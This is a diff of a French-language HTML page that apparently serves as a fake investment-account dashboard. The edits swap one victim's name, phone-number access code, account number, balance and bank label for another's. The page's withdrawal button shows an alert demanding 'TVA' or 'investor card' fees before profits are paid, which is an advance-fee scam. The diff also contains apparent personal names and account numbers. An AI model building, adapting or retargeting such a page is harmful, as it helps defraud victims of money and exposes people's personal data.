@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "71975235") {
+        if (code === "605703378") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 12 000 000 F CFA</span>
+                <span class="balance">Solde: 1 800 $</span>
                 <div class="account-info">
-                    <span id="user-name">DAYO ACHILLE</span><br>
-                    <span id="user-phone"> BF4326074080011985440120125 </span>
+                    <span id="user-name">Nkongolo Veronique Mangabu</span><br>
+                    <span id="user-phone"> 62515579988 </span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via FADA BANK</button>
+                <button id="orange-money">Retirer via FNK BANK</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "DAYO ACHILLE";
-                const accountNumber = "BF4326074080011985440120125";
-                const balance = "12 000 000 F CFA";
+                const accountName = "Nkongolo Veronique Mangabu";
+                const accountNumber = "62515579988";
+                const balance = "1 800 $";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via FADA BANK ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via FNB BANK ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("FADA N'GOURMA");
+                    setWithdrawalInfo("FNB");
                 }
             });
 
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher DAYO, veuillez payer les frais de TVA afin de recevoir vos bénéfices immediatement.');
+                alert('Cher Nkongolo, Veuillez payer les frais de carte d\'investisseur afin de recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Frais de tva néccéssaire.';
